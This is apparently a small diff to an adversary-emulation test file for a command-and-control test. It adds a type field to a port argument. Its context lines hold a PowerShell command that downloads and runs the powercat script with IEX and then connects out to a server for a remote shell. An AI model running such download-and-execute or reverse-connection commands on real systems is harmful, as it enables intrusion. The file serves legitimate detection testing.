@@ -29,6 +29,7 @@ atomic_tests:
   input_arguments:
     server_port:
       description: The port for the C2 connection
+      type: Integer
       default: 80
     ncat_exe:
       description: The location of ncat.exe
@@ -84,4 +85,3 @@ atomic_tests:
       IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
       powercat -c #{server_ip} -p #{server_port}
     name: powershell
-
